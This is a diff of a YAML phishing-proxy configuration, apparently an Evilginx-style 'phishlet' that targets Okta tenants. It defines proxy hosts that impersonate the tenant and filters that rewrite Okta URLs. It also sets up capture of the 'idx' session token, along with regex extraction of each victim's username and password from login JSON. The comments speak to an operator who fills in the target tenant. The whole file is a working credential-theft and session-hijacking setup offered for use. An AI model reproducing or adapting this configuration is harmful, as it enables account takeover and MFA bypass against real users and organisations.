@@ -1,38 +1,43 @@
+# Advanced Configuration for Okta Tenant Interception
+# Author: www.simplerhacking.com
+# Minimum Version Required: 3.0.0
+name: 'Okta'
+author: 'www.simplerhacking.com'
 min_ver: '3.0.0'
 
-author: 'www.simplerhacking.com'
-
-# List of proxy details. Okta tenant details needs to be added
+# Paste your actual Okta.com tenant in the <> parameter
 proxy_hosts:
- # 'okta-tenant-here' must be replaced by the actual Okta tenant name
- - {phish_sub: 'okta-tenant-here', orig_sub: 'okta-tenant-here', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
-
-# List of filters and their corresponding actions
+  - phish_sub: '<okta-tenant-placeholder>'
+    orig_sub: '<okta-tenant-placeholder>'
+    domain: 'okta.com'
+    session: true
+    is_landing: true
+    auto_filter: true
 sub_filters:
- # Replace 'okta-tenant-here' with your actual Okta tenant name
- - {triggers_on: 'okta-tenant-here', orig_sub: '', domain: 'okta-tenant-here', search: 'okta-tenant-here.okta.com', replace: '{hostname}', mimes: ['application/ion+json']}
- - {triggers_on: 'okta-tenant-here', orig_sub: '', domain: 'okta-tenant-here', search: 'https.*\.okta\.com', replace: 'https://{hostname}', mimes: ['text/html']}
-
-# Identification tokens for the Okta API, replace 'okta-tenant-here' with the Okta tenant
+  - triggers_on: '<okta-tenant-placeholder>'
+    orig_sub: ''
+    domain: '<okta-tenant-placeholder>'
+    search: '<okta-tenant-placeholder>.okta.com'
+    replace: '{hostname}'
+    mimes: ['application/ion+json']
+  - triggers_on: '<okta-tenant-placeholder>'
+    orig_sub: ''
+    domain: '<okta-tenant-placeholder>'
+    search: 'https.*\.okta\.com'
+    replace: 'https://{hostname}'
+    mimes: ['text/html']
 auth_tokens:
- - domain: 'okta-tenant-here'
-   keys: ['idx']
-
-# Capture the username and password during the phishing process
+  - domain: '<okta-tenant-placeholder>'
+    keys: ['idx']
 credentials:
- username:
-   key: ''
-   search: '"identifier":"([^"]*)'
-   type: 'json'
- password:
-   key: ''
-   search: '"passcode":"([^"]*)'
-   type: 'json'
-
-# Specifies the login endpoint, replace 'okta-tenant-here' with the Okta tenant
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"passcode":"([^"]*)'
+    type: 'json'
 login:
- domain: 'okta-tenant-here'
- path: '/login/login.htm'
-
-
-# Ensure to replace 'okta-tenant-here' with the actual name of your Okta tenant. 
+  domain: '<okta-tenant-placeholder>'
+  path: '/login/login.htm'
